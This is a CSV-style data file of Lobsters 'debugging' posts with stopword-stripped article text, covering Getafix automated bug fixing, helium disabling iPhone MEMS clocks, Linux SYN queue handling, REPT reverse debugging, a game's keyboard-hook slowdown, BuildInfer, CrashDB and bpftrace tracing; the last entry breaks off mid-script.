258,Lobsters,debugging,Debugging,How Facebook tools learn to fix bugs automatically,https://code.fb.com/developer-tools/getafix-how-facebook-tools-learn-to-fix-bugs-automatically/,facebook tool learn fix bug automatically,infer sapfix sapienz getafix differs simpler autofix tool null method call deep dive key technical detail tree differencer identifies change tree level new way mining fix pattern getafix creates patch implementation performance null method call return nullable field nullable increasing getafix impact,facebook built tool called getafix automatically find fix bug offer engineer approve allows engineer work effectively promotes better overall code quality believe getafix first tool kind deployed production facebook scale contributing stability performance apps billion people use getafix power sapfix suggests fix bug sapienz testing tool find getafix also provides fix bug found infer static testing tool getafix learns engineer past code fix recommendation intuitive engineer review getafix improves upon previous autofix technology using powerful technique learning fix pattern past code change getafix us powerful clustering algorithm also analyzes context around particular line problematic code find appropriate fix modern production codebases extremely complex updated constantly create system automatically find fix bug without help engineer built tool learns engineer previous change codebase find hidden pattern us identify likely remediation new bug tool called getafix deployed production facebook contributes stability apps billion people use getafix work conjunction two facebook tool though technology used address code issue source currently suggests fix bug found infer static analysis tool identifies issue null pointer exception android java code also suggests fix via sapfix bug detected sapienz intelligent automated testing system apps previously given overview sapfix sapienz offering deep dive getafix learns fix bug using term broadly refer code issue cause app crash goal getafix let computer take care routine work albeit watchful eye human must decide bug requires complex nonroutine remediation tool work applying new method hierarchical clustering many thousand past code change human engineer made looking change also context around code change method allows detect underlying pattern bug corresponding fix previous autofix tool getafix also narrow space possible program change need searched find fix bug enabling select appropriate patch quickly without high computation time brute force logicbased technique require efficient approach make possible deploy getafix production environment time getafix learns past code change also produce fix easy human engineer understand getafix deployed facebook automatically suggest fix null dereference bug infer report well suggest fix null dereferencerelated crash error sapienz flag also used resolve code quality concern found revisiting existing code newer version infer getafix differs simpler autofix tool current industrial practice autofixes used primarily basic issue whereas code remediation straightforward example analyzer might warn dead exception developer probably forgot add throw new exception autofix make change straightforward defined author lint rule without knowing specific context applied getafix offer significantly general capability remediating issue case fix contextdependent sample code example getafix offer following fix response infer bug line sample bug reported code review portal along getafixgenerated fix note fix depends variable ctx also return type method unlike simple lint remediation fix kind baked infer figure additional example fix getafix offer infer bug even though bug infer null method call indicates risk nullpointerexception thrown fix unique notice fix indistinguishable kind developer typically make deep dive key technical detail getafix organized toolchain shown diagram section describe functionality challenge three main component tree differencer identifies change tree level abstractsyntaxtreebased differencer first used identify concrete edits made pair source file successive revision file example detect granular edits wrapping statement adding nullable annotation import prepending conditional early return existing method body among others example insertion conditional early return dog null rename public private move method detected concrete edits whereas linebased diffing tool would mark either method fully removed inserted tree differencer detects move hence also detect insertion within moved method concrete edit challenge tree differencer efficiently precisely align part tree right concrete edits mapping tree get discovered new way mining fix pattern getafix performs pattern mining using new hierarchical clustering technique along antiunification existing method generalizing among different symbolic expression creates collection possibly related tree difference us fix pattern representing common program transformation collection pattern abstract containing hole program transformation differ following example image show hierarchical structure known dendrogram result set edits case show edit previous example row show edit pattern purple blue along metadata vertical black bar corresponds level hierarchy edit pattern top black bar pattern obtained antiunification edits belonging level hierarchy edits connected smaller thin black line antiunification combine early return dog null edit previous example another edit difference dog drinking result abstract fix pattern represents commonality symbol introduced antiunification indicates hole instantiated based context edit pattern combine edit pattern variation variable name still overall structure process produce increasingly abstract edit pattern go tree example could combine edit catrelated edit obtain abstract edit shown near top diagram seriously though hierarchical matching process produce powerful framework getafix discover reusable pattern code change picture show dendrogram laid sideways miniaturized obtained combining edits fixed null pointer error reported infer codebase period time fix pattern seek mine hidden dendrogram idea antiunificationbased pattern mining new several enhancement necessary mine pattern used generate rank reasonably small number fix new bug one change inclusion portion surrounding code change result edit change allows u find pattern change people make also pattern context change applied example first dendrogram notice two distinct edits adding dog null return dogdrink even though dogdrink unchanged included part pattern context telling u apply fix higher level hierarchy edits dogdrink context merges context become abstract context restricts place pattern apply realistic example follows next section greedy clustering algorithm suggested past literature autofix tool unlikely learn context greedy clustering algorithm maintains single representation cluster include extra context present edits training data example edit inserting list null return listget merged dogdrink example greedy clustering would lose context insert early return getafix hierarchical clustering approach keep much context possible level becoming general higher structure certain level even general context hope learn lost still present lower level structure addition surrounding code also associate edits infer bug report prompted first place allows u learn edit pattern relate corresponding bug report variable infer blame bug report shown errorvar first dendrogram figure participates antiunification ending hole allows u later substitute blamed variable presented new infer bug report making fix pattern specific getafix creates patch final step take buggy source code fix pattern pattern mining step produce patched version source code typically many fix pattern choose seen dendrogram challenge address step selecting correct pattern fix particular bug pattern applies several location getafix must also select right match following example illustrate general approach address challenge getafix example consider pattern mined null return briefly explain step produce following patch previously unseen code getafix creates patch using following step find subast matching part mlistviewclearlisteners instantiate hole replace subast instantiated part note part bound inclusion unmodified context helpfully restricts number place pattern applies without unmodified context pattern would nothing null return pattern applies unintended place mlistviewclearlisteners even mlistview null insertiononly pattern fact also appear higher dendrogram pattern context antiunified pattern inserting return front different statement next example illustrates getafix deal pattern seem apply many place example consider following pattern null typically patch would get mined fix within condition return expression expect applied well also match situation call statement shown previous example mlistviewclearlisteners getafix ranking strategy try estimate likelihood pattern indeed fix likely fix given context strategy allows system le reliant validation step later thus saving time pattern compete pattern specific null pattern example applies call statement rather expression specific pattern match fewer place thus considered specialized situation getafix rank higher implementation performance getafix deployed facebook automatically suggest fix null dereference bug reported infer static analysis tool well suggest fix null dereferencerelated crash bug sapienz find also used resolve outstanding infer bug past one experiment compared getafixcomputed fix actual humanwritten past fix infer null method call bug data set small edits fewer five line changed case getafix highestranked patch exactly matched humancreated patch another experiment looked subset instagram codebase tried bulkfix null method call issue getafix able attempt patch percent bug percent attempt passed automatic validation meaning compilable infer longer emitted warning overall getafix successfully automatically patched percent null method call bug addition suggesting fix new infer bug introduced also using infrastructure clean backlog infer bug made past code review codebase cleaned hundred return nullable infer bug field nullable infer bug part effort interestingly suggesting autofixes next return nullable field nullable bug resulted increase fix rate percent percent percent percent respectively overall couple hundred additional bug fixed past three month getafix displayed suggestion getafix also produce fix sapfix address crash sapienz detects past month getafix provided half fix candidate sapfix us considers valid test passed fix candidate getafix provides sapfix percent pas test increasing getafix impact getafix helped u advance toward goal letting computer take care routine bugfixing work continue refine testing verification tool expect getafix able prevent larger portion postdeployment failure note fix pattern getafix mine need come response inferrelated fix indeed also come fix made response manual code inspection additional source fix pattern open exciting possibility automating repetitive code review word bug flagged remediated across codebase multiple time past flagged automatically future code commit without human needing getafix part overall effort build intelligent tool rely statistical analysis large code corpus associated metadata tool potential improve aspect software development life cycle including code discovery code quality operational efficiency insight gain getafix help u building deploying additional tool space like thank jeremy dubreil well alexandru marginean sapfix team help integrating getafix infer sapfix respectively
259,Lobsters,debugging,Debugging,iPhones are Allergic to Helium,https://ifixit.org/blog/11986/iphones-are-allergic-to-helium/,iphones allergic helium,started getting call electromagnetic pulse mri machine microelectromechanical system iphone gyro teardown erik symptom user guide faq pixel tiny grain sand,kind tale hear every day erik wooldridge system specialist morris hospital near chicago installation new ge healthcare mri machine started getting call cell phone working apple watch started glitching immediate thought mri must emitted sort emp case could lot trouble electromagnetic pulse would taken medical equipment facility well working fine started investigating learned every single impacted device made technician android phone fine widesweeping issue impacting different device heck seen lot strange glitch time never heard something like neither erik behavior device pretty odd completely dead plugged wall indication device charging device powering seemed issue cellular radio wifi connection consistent fast cellular hit miss posted issue reddit sysadmins speculated might caused liquid helium used cool mri machine investigated found helium leak time vented building mri machine discovered helium leakage occurred new magnet ramped cool approximately liter liquid helium vented course hour vent place functioning must leak mri room isolated hvac loop share air facility know much liter ended going outdoors much ended inside helium expands time expands liquid gas lot helium l gaseous bet nurse voice higher pitched day device started slowly recover initial incident completely abnormal device one iphone severe service issue incident apple watch remained touch screen working even several day performed triage categorizing device type model iphones apple watch afflicted iphone higher apple watch series higher one iphone building know impacted way question time occurred would cause apple device stop working piqued interest reached friend make mem silicon microelectromechanical system smallest mechanical apparatus world every phone gyroscope accelerometer micrometerthin element initial theory shared reddit helium molecule small enough get inside vacuumsealed chip interfere mechanical working two problem idea one apple alone using mem phone android phone affected perhaps bug io cause crash get faulty data gyro bug impacted apple watch run watchos additionally iphones earlier affected seems unlikely new software bug impacted io watchos inside mem gyroscope iphone gyro teardown else could well heart every electronic device clock traditionally quartz oscillator crystal vibrate specific predictable khz first invented enabled first digital quartz watch frequency generator heart every electronic device without clock system stand still cpu flat work clock literally heartbeat modern device quartz oscillator problem keep time well high low temperature relatively large mm quest smaller smaller hardware apple recently started using mem timing oscillator specialized company called sitime replace quartz component mem oscillator seen electron microscope specifically using world smallest lowest power khz oscillator mem device susceptible helium intrusion could culprit failing oscillator would match erik symptom reproduced experiment placed iphone plus sealed bag filled helium incredibly realistic original iphones would exposed much lower concentration still support idea helium disable device video leave display running stopwatch duration test around minute second phone lock nothing crazy really happens clock stop nothing else display stay though able repeat experiment lab iphone lasted four minute helium atmosphere shut entirely sure enough apple user guide iphone apple watch admits problem exposing iphone environment high concentration industrial chemical including near evaporating liquified gas helium may damage impair iphone functionality device affected show sign powering device typically recovered leave unit unconnected charging cable let air approximately one week helium must fully dissipate device device battery fully discharge process week plug device directly power adapter let charge one hour device turned emphasis added hydrogen helium notoriously hard contain molecule small sound like problem sitime working solve found faq effective hermetic seal mem oscillator previous generation episeal resonator may impacted large concentration smallmolecule gas newer episeal resonator impervious smallmolecule gas please contact sitime case planning use sitime device large concentration smallmolecule gas recommend appropriate immune part emphasis added curious would impact kind mem device reached invensense motion company make image stabilizing chip pixel david almoslino senior director corporate marketing confirmed issue told product somewhat susceptible helium helium diffuse fusion bond oxide cause cavity pressure increase pressure sensor helium could cause absolute accuracy temporarily degrade gyro sensor helium could cause offset drift could cause oscillation temporarily stop accelerometer sensor helium little impact invensense part recover removed helium environment course reason never heard rare situation silicon manufacturer aware minimize problem david told helium leak test pretty standard mem test done company ass vacuum package like incredibly tiny grain sand helium molecule small enough get inside device physically stop clock turn phone temporarily paperweight
260,Lobsters,debugging,Debugging,SYN packet handling in the wild,https://blog.cloudflare.com/syn-packet-handling-in-the-wild/,syn packet handling wild,understanding receive buffer tuning cc image isaí moreno tale two queue syn queue doc describe toggle accept queue queue size limit syn queue length counted differently perfect backlog value golang famously nt support customizing backlog value overenginered systemtap script slow application nginx tuning epoll work distribution follow showing useful systemtap script systemtap script cc image internetsdairy syn flood syn flood attack syn cooky nt kernel syn cooky tcp timestamps truncated distinct value syn flood cloudflare scale attack million packet per second introducing bpf compiler meet gatebot bot allows u sleep evolving landscape excellent explanation andreas veithen comprehensive paper gerald w gordon world famous team,cloudflare lot experience operating server wild internet always improving mastery black art blog touched multiple dark corner internet protocol like understanding receive buffer tuning cc image isaí moreno one subject nt enough attention though syn flood use linux turn syn packet handling linux truly complex post shine light subject tale two queue first must understand bound socket listening tcp state two separate queue syn queue accept queue literature queue often given name reqskqueue ack backlog listen backlog even tcp backlog stick name avoid confusion syn queue syn queue store inbound syn packet specifically struct inetrequestsock responsible sending synack packet retrying timeout linux number retries configured sysctl doc describe toggle tcpsynackretries integer number time synacks passive tcp connection attempt retransmitted higher default value corresponds second till last retransmission current initial rto final timeout passive tcp connection happen second transmitting synack syn queue wait ack packet client last packet threewayhandshake received ack packet must first matched fully established connection table data relevant syn queue syn queue match kernel remove item syn queue happily creates fully fledged connection specifically struct inetsock add accept queue accept queue accept queue contains fully established connection ready picked application process call accept socket dequeued passed application rather simplified view syn packet handling linux socket toggle like tcpdeferaccept tcpfastopen thing work slightly differently queue size limit maximum allowed length accept syn queue taken backlog parameter passed listen syscall application example set accept syn queue size listen sfd note kernel syn queue length counted differently syn queue cap used configured toggle nt case anymore nowadays netcoresomaxconn cap queue size server set sysctl netcoresomaxconn netcoresomaxconn perfect backlog value knowing might ask question ideal backlog parameter value answer depends majority trivial tcp server nt really matter example version golang famously nt support customizing backlog value valid reason increase value though rate incoming connection really large even performant application inbound syn queue may need larger number slot backlog value control syn queue size effectively read ack packet flight larger average round trip time client slot going used case many client far away server hundred millisecond away make sense increase backlog value tcpdeferaccept option cause socket remain synrecv state longer contribute queue limit overshooting backlog bad well slot syn queue us memory syn flood make sense waste resource storing attack packet struct inetrequestsock entry syn queue take byte memory kernel peek syn queue linux use s command look synrecv socket example one cloudflare server see slot used syn queue s n state synrecv sport wc l s n state synrecv sport wc l similar data shown overenginered systemtap script resqstp slow application happens application ca nt keep calling accept fast enough magic happens accept queue get full size inbound syn packet syn queue dropped inbound ack packet syn queue dropped tcpextlistenoverflows linuxmiblistenoverflows counter incremented tcpextlistendrops linuxmiblistendrops counter incremented strong rationale dropping inbound packet pushback mechanism party sooner later resend syn ack packet point hope slow application recovered desirable behavior almost server completeness adjusted global toggle better touch server need handle large number inbound connection struggling accept throughput consider reading nginx tuning epoll work distribution post follow showing useful systemtap script trace accept queue overflow stats looking nstat counter nstat az tcpextlistendrops tcpextlistendrops global counter ideal sometimes saw increasing application looked healthy first step always print accept queue size s s plnt sport state recvq sendq local address port peer address port listen column recvq show number socket accept queue sendq show backlog parameter case see outstanding socket accept ed still saw listendrops counter increasing turn application stuck fraction second sufficient let accept queue overflow brief period time moment later would recover case like hard debug s wrote acceptqstp systemtap script help u hook kernel print syn packet dropped sudo stap v acceptqstp time u acceptq qmax local addr remoteaddr see precisely syn packet affected listendrops script trivial understand application dropping connection cc image internetsdairy syn flood possible overflow accept queue must possible overflow syn queue well happens case syn flood attack past flooding syn queue bogus spoofed syn packet real problem possible successfully deny service almost tcp server little bandwidth filling syn queue solution syn cooky syn cooky construct allows synack generated statelessly without actually saving inbound syn wasting system memory syn cooky nt break legitimate traffic party real respond valid ack packet including reflected sequence number cryptographically verified default syn cooky enabled needed socket filled syn queue linux update couple counter syn cooky syn cookie sent tcpexttcpreqqfulldocookies linuxmibtcpreqqfulldocookies incremented tcpextsyncookiessent linuxmibsyncookiessent incremented linux used increment tcpextlistendrops nt kernel inbound ack heading syn queue syn cooky engaged tcpextsyncookiesrecv linuxmibsyncookiesrecv incremented crypto validation succeeds tcpextsyncookiesfailed linuxmibsyncookiesfailed incremented crypto fails sysctl disable syn cooky forceenable default good nt change syn cooky tcp timestamps syn cooky magic work nt without disadvantage main problem little data saved syn cookie specifically bit sequence number returned ack bit used follows bit bit bit mod ms hash ip port ms setting truncated distinct value linux nt know optional tcp parameter party information timestamps ecn selective ack window scaling lost lead degraded tcp session performance fortunately linux work around tcp timestamps enabled kernel reuse another slot bit timestamp field contains bit bit bit bit timestamp ecn sack wscale tcp timestamps enabled default verify see sysctl sysctl historically plenty discussion usefulness tcp timestamps currently cloudflare tcp timestamps disabled finally syn cooky engaged cool feature wo nt work thing like tcpsavedsyn tcpdeferaccept tcpfastopen syn flood cloudflare scale syn cooky great invention solve problem smaller syn flood cloudflare though try avoid possible sending couple thousand cryptographically verifiable synack packet per second okay see attack million packet per second scale synack response would litter internet bringing absolutely benefit instead attempt drop malicious syn packet firewall layer use syn fingerprint compiled bpf read blog post introducing bpf compiler detect deploy mitigation developed automation system call gatebot described meet gatebot bot allows u sleep evolving landscape slightly outdated data subject read excellent explanation andreas veithen comprehensive paper gerald w gordon linux syn packet handling landscape constantly evolving recently syn cooky slow due old fashioned lock kernel fixed rely kernel able send million syn cooky per second practically solving syn flood problem user proper tuning possible mitigate even annoying syn flood without affecting performance legitimate connection application performance also getting significant attention recent idea like soattachreuseportebpf introduce whole new layer programmability network stack great see innovation fresh thinking funneled networking stack otherwise stagnant world operating system thanks binh le helping post dealing internals linux nginx sound interesting join world famous team london austin san francisco elite office warsaw poland
261,Lobsters,debugging,Debugging,REPT: reverse debugging of failures in deployed software,https://blog.acolyer.org/2018/10/17/rept-reverse-debugging-of-failures-in-deployed-software/,rept reverse debugging failure deployed software,rept reverse debugging failure deployed software reverse debugging intel pt recovery challenge reversing instruction recovering memory writes handling concurrency evaluation,rept reverse debugging failure deployed software cui et al osdi rept repeat best paper award osdi month address problem debugging crash production software available memory dump particular talking debugging window binary effectively understand fix bug developer want able follow path leading point failure control flow also data value involved known reverse debugging clever rept enables reverse debugging without high overhead recordreplay system typically combine low overhead hardware tracing intel pt record program control flow novel binary analysis technique recover good percentage data flow information evaluated realworld bug software chrome apache php python rept enabled effective reverse debugging including concurrency bug repts offline binary analysis reverse debugging integrated windbg window error reporting service wer enhanced support rept developer request intel pt enriched memory dump received anecdotal story microsoft developer using rept successfully debug failure reported wer first production bug successfully resolved help rept left unfixed almost two year developer could reproduce crash reverse engineering enabled rept developer able step function based reconstructed execution history quickly find root cause fix bug summary twoyearold bug fixed minute thanks rept reverse debugging intel pt practical production deployment rept need impose low runtime performance overhead recover execution history accurately efficiently work unmodified source codebinaries apply broad class bug including eg concurrency bug address first requirement rept us perthread circular buffer mode intel pt capture trace whole execution tracing introduces much performance overhead traced process fails final state recorded intel pt trace saved single memory dump overhead intel pt mode shown range application starting memory dump give u control flow final memory state main task repts offline analysis recover data flow working solely memory dump avoids need modification existing program performing analysis instruction binary level mean rept agnostic programming language compiler recovery challenge ideal world given final memory state instruction sequence would simply walk backwards instruction recover previous state practice thing quite simple many instruction irreversible eg xor rax rax since destroy information many destination address memory writes determined statically always possible infer order concurrent shared memory access rept overcome hurdle reversing instruction instruction reversible move backwards instruction sequence recover state based example state rbx instruction add rax rbx state immediately prior execution instruction must many instruction irreversible able recover state earlier instruction sequence may able work forward rept combine two idea working iteratively backward forward instruction sequence recover data value new value recovered consider following example iteration start state rbx work backwards instruction sequence filling infer eg rax value execution marking unknown iteration begin start instruction sequence work forward deduce rbx must execution instruction hence must one execution instruction also iteration work backwards time able fill another gap knowledge deduce rax must execution must also prior execution well recovering memory writes far dealing instruction access memory thing get little complex memory access picture memory write instruction whose destination unknown correctly update value destination memory missing update may introduce obsolete value would negatively impact subsequent analysis rept us error correction help figure write destination us memory value possibly valid assuming overwritten infer value using procedure examined inferred value later turn invalid based conflict start error correction process consider following example g represents memory address global variable first iteration work backwards since know value rbx change memory value second iteration forward analysis uncover rax must generates conflict come infer value rax instruction think already stored value analysis keep original value inferred final program state assume correct third iteration backward analysis based rax value instruction recover g value performing forward backward analysis rept maintains data inference graph capturing everything know register memory location accessed instruction separate node graph reading addressregister use node writing def node value edge node node b mean rept us value infer b address edge node node b mean value used compute b address within graph value conflict occur inferred value match existing value example walked edge conflict occurs newly identified def node memory location break previously assumed defuse relationship either type conflict detected invalidation process run starting initial node propagate unknown see section paper detail remove incorrect assumption get back forward backward analysis phase handling concurrency yet another issue multiple instruction sequence executed simultaneously multiple core large number way order instruction timing information intel pt pretty good use establish partial order among instruction sequence one subsequence start time another subsequence end time infer relative execution order may still leave u smaller set concurrent subsequence given multiple instruction sequence executed simultaneously multiple core rept first divide subsequence merges single conceptual instruction sequence based inferred order two subsequence whose order inferred rept arbitrarily insert one newly constructed sequence arbitrary selection matter writes case rept remove inference edge constructed graph limit use uncertain memory access inference observation rept analysis work long two separate concurrent writes one affect inference another destination acknowledge possibility exists depends granularity timing information given timestamp granularity supported modern hardware deem rare case practice evaluation rept evaluated failure caused realworld bug shown table intel pt configured finegrained timestamp logging level circular buffer byte per thread applicable time travel debugging ttd used capture establish ground truth data value starting experiment single thread rept able correctly infer value high accuracy ten thousand instruction outlier involves large number memory allocation right program failure rept evaluated two race condition bug test multithread accuracy value defect failure recovered correctly value recovered lower score attributed large number instruction half million defect failure python case runtime overhead intel pt offline analysis running single quadcore machine ram completes second bug rept successfully address bug rept unsuccessful rept work collected trace contains inplace code update jitted code fails intel pt trace parsing rept work deadlock bug triggering infinite loop fill circular buffer cause prior program history lost addition reverse debugging believe one leverage execution history recovered rept perform automatic root cause analysis challenge data recovery rept perfect research question perform automatic root cause analysis based imperfect information provided rept
262,Lobsters,debugging,Debugging,"I can’t type properly when the game is minimized, why?",https://cookieplmonster.github.io/2018/10/12/i-cant-type-when-the-game-is-minimized/,type properly game minimized,saint row third message hook message hook affect process running level permission installed global scope investigation call made sending message thread installed hook fix msgwaitformultipleobjects sending success appendix really,saint row third always minor annoyance showing minimized game although first glance everything seemed behave expected tried write anything would find game running background typing becomes ridiculously slow happen saint row iv mean issue side effect something got changed srtt sriv moreover happens executables safe assume nothing graphic api used message hook safe assume whatever sr process affecting application potential candidate would message hook important know type hook may installed threadwide however hook get installed systemwide single process affect process running level permission match current observation let see srtt us message hook sure enough lowlevel keyboard input hook installed keyboardllhk null getmodulehandlea null keyboardllhk setwindowshookexa whkeyboardll fnkeyboardllhook hook type may installed global system scope may global perthread whkeyboardll installed global scope saint row installs hook nonelevated process running system investigation proceed let see sr minimized attaching debugger game minimized stopping execution time bound reveal frequently executed code spot answer actually fairly obvious ntdlldll ntdelayexecution kernelbasedll sleepex kernelbasedll sleep frame may incorrect andor missing symbol loaded basethreadinitthunk ntdlldll rtluserthreadstart ntdlldll rtluserthreadstart sensibly coded game sr sleeping lot minimized point game hogging resource idling taskbar precise sleep long nice relate process acting slow devil detail refer msdn doc whkeyboardll hook type something suspicious mentioned text emphasis added hook called context thread installed call made sending message thread installed hook therefore thread installed hook must message loop catch turn way specific hook work requires immediate input application installed sending synchronous posting would asynchronous may think like process system upon receiving keyboard input message poke sr process sending message hey keyboard input may process oh yes sure wait suddenly sleeping change good practice horrible horrible idea hook process receiving keyboard input wait sr wake sleep process message jumping back code processing input exactly reason sr limit typing speed approximately character per second minimized scary fix fix course could remove offending sleep call would make sr spin needlessly minimized way sleep wake sr need process thankfully msgwaitformultipleobjects exactly need even specify specific message want wake initially expected game need wait qsinput type message input mouse keyboard raw input however case recall said way hook notifies thread installed hook though sending message therefore need wake message sent thread thankfully qssendmessage simple replacement function injected instead stock sleep call trick wonderfully message sleep sleep dwmilliseconds case unless message sent process happens wake immediately void msgsleep dword dwmilliseconds msgwaitformultipleobjects nullptr false dwmilliseconds qssendmessage minimize game type full speed success appendix important thing note case concentrated purely preventing issue caused using keyboard input message hook reality would rather ask question really really really need application install global message hook really global scope per thread see saint row third need proposed fix present game patch oct edit anymore later point went back checked sr really need hook turn removing avoids issue investigated finding fix neat thing sometimes even better take step back look bigger picture case paid edits october rephrased sentence accurate
263,Lobsters,debugging,Debugging,Announcing BuildInfer for C++,https://medium.com/@buckaroo.pm/announcing-buildinfer-for-c-3dfa3eb15feb,announcing buildinfer c,announcing buildinfer c analyze visualize migrate buildsystems get touch http buildinferloopperfectcom great could extract readable build description c project regardless buildsystem used announcing buildinfer buck initial finding buck mapnik headerfile,announcing buildinfer canalyze visualize migrate buildsystemsis c build slow unintelligible currently looking case study interested improving linuxbased build commercial opensource please get touch http buildinferloopperfectcomthe c community fragmented due variety buildsystems used fragmentation make difficult understand thirdparty library worksintegrate two library togetheroptimize across library eg lto build tooling c sourcecode header implement artefact cachingidentify step build process slowing downfor c community mean time wasted gluing project togethertime wasted waiting slow buildstime wasted rewriting code already exists difficult integratewouldn great could extract readable build description c project regardless buildsystem used announcing buildinferby recording build process systemlevel infer highlevel information project structure since buildinfer record lowlevel technique work c build systemonce highlevel build description visualize transform even port complex buildsystems powerful one buck bazelinitial findingswe already success porting following project buck furthermore discovered none project ship reproducible buildsystem porting buck guarantee thisreproducible build crucial security cache performance debugging information see mapnikmapnik open source mapping toolkit desktop serverbased map rendering written cporting mapnik scons buck reduces buildtimes minute minuteswe estimate enabling precompiledheaders improve buildtimes mapnik use versionscripts requiresfvisibilityinline shared build prevent symbol clash identified core issue non static definition within headerfile using buildinfer outputwe generated graph showing interaction individual file group executables
264,Lobsters,debugging,Debugging,CrashDB,https://github.com/gunnihinn/crashdb,crashdb,crashdb feature build use profile red method,crashdb crashdb ephemeral inmemory nosql database confident developer feature crashdb webscale data persisted process restarts using wrong http method crash database getting key nt database crash database using malformed json crash database system error crash database privacy security crashdb provide method reveal key currently stored database build make crashdb accepts commandline option argument use health check curl get value db curl x get data key mykey put value db curl x post data key mykey value myvalue key must string crashdb support arbitrary value encoded json curl x post data key mykey value foo bar learn improve debug thing somehow crashdb shortage problem discover fix improving crashdb improve developer author recommends following point aimed making single instance crashdb le terrible aimed treating crashdb like distributed system run sadnesssh google delve find looking become sad part life author note really work linux sadly discovered last throe pretending osx decent operating system development bend docker make work osx find improve error message get better idea went wrong collect error message somewhere search use issue tracker issue tracker keep track think wrong thing folder two folder called open closed text file version control perfectly good issue tracker beginner decide whether fix race condition run sadnesssh right embracing channel using fucking mutex like everyone world apparently reflect erlangelixir debate whether would problem find thing care improve crashdb direction realize week work thing bad idea work need thrown away ok question original design decision really necessary serialize deserialize value time add unacceptable overhead intricate key potential do vector craft keyvalue pair result arbitrarily bad performance profile crashdb get torture test sample query exhibit problem want fix performance characteristic program profile fix see impact make crashdb persistent figure store data restarts crash need worry data getting corrupted add monitoring crashdb service red method seems appropriate decide whether use push monitoring à la graphite pull monitoring à la prometheus support alternative serialization format json fine thing use number le fine consider binary format like protocol buffer use schema autogenerate client crashdb least one language run crashdb docker run two setup masterslave replication chain direct writes master read slave service discovery outside world run three instance slave elect new master original one becomes sad find zookeeper thing try query cluster outside
265,Lobsters,debugging,Debugging,bpftrace (DTrace 2.0) for Linux 2018,http://www.brendangregg.com/blog/2018-10-08/dtrace-for-linux-2018.html,bpftrace dtrace linux,alastair robertson dtrace oneliners bpftrace bpftrace dtrace linux ebpf bcc willian gaspar matheus marchini issue list reference guide prior commits freebsd dtrace tutorial bpftraceebpf v dtrace equivalency express data path container security networking iptables infrared decoding intrusion detection hyperupcalls fuse performance save retrieve stack trace offwake time dtrace bpftrace cheatsheet reference guide script comparison take long linux nt company giant arrow linux funding went systemtap goodenough solution ctfbtf default install crisis tool dtrace ply ply ply repo acknowledgement dtrace linux bcc conclusion tracing summit ubuntu bpftrace install instruction,private bpftrace repository made public big news dtrace fan created alastair robertson bpftrace open source highlevel tracing frontend let analyze system custom way shaping dtrace version capable built ground modern era ebpf virtual machine ebpf extended berkeley packet filter linux kernel new hotness system engineering developed bsd bpf originated screenshot tracing read latency pid bpftrace e kprobe vfsread pid start tid nsecs kretprobe vfsread start tid n hist nsecs start tid delete start tid attaching probe c n oneliners new process argument bpftrace e tracepoint syscalls sysenterexecve join args argv file opened process bpftrace e tracepoint syscalls sysenteropen printf sn comm str args filename syscall count program bpftrace e tracepoint rawsyscalls sysenter comm count syscall count syscall bpftrace e tracepoint syscalls sysenter probe count syscall count process bpftrace e tracepoint rawsyscalls sysenter pid comm count read byte process bpftrace e tracepoint syscalls sysexitread args ret comm sum args ret read size distribution process bpftrace e tracepoint syscalls sysexitread comm hist args ret disk size process bpftrace e tracepoint block blockrqissue printf dn pid comm args byte page paged process bpftrace e software comm count page fault process bpftrace e software comm count profile userlevel stack hertz pid bpftrace e profile pid ustack count look familiar old dtrace oneliners switched bpftrace also milestone see work bpftrace bpftrace dtrace capability bpftrace prior work led bpftrace aka bpftrace discussed earlier dtrace linux post explains linux kernel gained ebpf virtual machine using run tracing program post covered bcc front end bpf complier collection let rewrite dtracetoolkit tool bcc powerful laborious program bpftrace complimentary addition provides highlevel language oneliners short script alastair recently developed struct support applied tracepoints used oneliners applied kprobes yesterday last major missing piece example cat pathbt include linuxpathh include linuxdcacheh kprobe vfsopen printf open path sn str path dentry dnamename bpftrace pathbt attaching probe open path dev open path open path retranstimems willian gaspar matheus marchini contributing capability bug fix list minor work left see issue list done see reference guide prior commits bpftrace us existing linux kernel facility ebpf kprobes uprobes tracepoints perfevents well bcc library internally bpftrace us lexyacc parser convert program ast llvm ir action bpf learn bpftrace created couple reference oneliners tutorial based freebsd dtrace tutorial think timeefficient way learn bpftrace well dtrace freebsd since helped developed bpftrace aware fresh code likely introduced bug might bpftrace sigsegv coredump probably let u know already fixed plenty might bpftrace spew incomprehensible llvm bpf verifier error v probably let u know might bpftrace panic kernel much le likely since component ebpf year old expect userlevel bug bpftrace process crash get stuck need killed let u know github please help fix issue bpftrace test suite test bpftraceebpf v dtrace equivalency show example bpftraceebpf v dtrace section follow important note ebpf engine created linux version dtrace ebpf ebpf created alexei starovoitov plumgrid facebook generic inkernel virtual machine software defined network primary use case observability one many use case express data path container security networking iptables infrared decoding intrusion detection hyperupcalls fuse performance ebpf hard use directly bcc created python frontend bpftrace created even higherlevel front end custom adhoc tracing serve similar role dtrace adding bpftrace feature need dtrace think dozen thing dtrace bpftrace currently including custom aggregation printing shell argument translator sizeof speculative tracing forced panic may add need arises far nt really needed case best left bcc rather cluttering bpftrace niche functionality dtrace lacked functionality like argument processing implemented elsewhere shell wrapper instead augmenting bpftrace shell wrapper switch bcc make use python library including argparse make bpftrace bcc complimentary visualizing also number thing ebpf dtrace ca nt one want mention ability save retrieve stack trace variable already used bpftrace debug file descriptor leak production tool fdleakbt kretprobe allocfd fd retval allocstack comm pid fd ustack kprobe closefd fd delete allocstack comm pid fd output show userlevel stack allocated freed work saving stack allocation deleting free bpftrace exit print leftover allocstack stack nt freed wrote longer version includes timestamps find longerterm survivor apply technique object allocation whip leak detection tool fly dtrace required dumping stack file postprocessing involved much higher overhead ebpf inkernel filter potentially million object allocated freed quickly even important use case showed offwake time post prior bpftrace saving waker stack associating sleeper stack hard overstate important make offcpu analysis effective counterpart cpu analysis combination cpu offcpu analysis mean way attack performance issue performance engineer dream dtrace bpftrace cheatsheet already know dtrace take ten minute learn equivalent bpftrace key difference august typedtracebpftrace function quantize value hist value function lquantize value min max step lhist value min max step variablethis name name variableself name name tid variablename key name key variableglobalname globalname variableself name name tid variablecurthreadcurtask variableprobeprov probemod probenameprobe providerfbt func entrykprobe func providerfbt func returnkretprobe func providerpid target func entryuprobe func providerpid target func returnuretprobe func providerprofile providerprofile list nt cover extra thing bpftrace like access aggregation element userlevel tracing system wide save stack variable etc see reference guide detail script comparison could pick script minimize maximize difference either would misleading comparison averagesized dtracetoolkit script seeksized us common functionality dtrace pragma option quiet print header dtrace begin printf tracing hit ctrlc endn self int last devt process io start io genunix start self last args bedev calculate seek distance last self last args bedev dist int args bblkno last args bblkno last last args bblkno store detail size pid curpsinfo 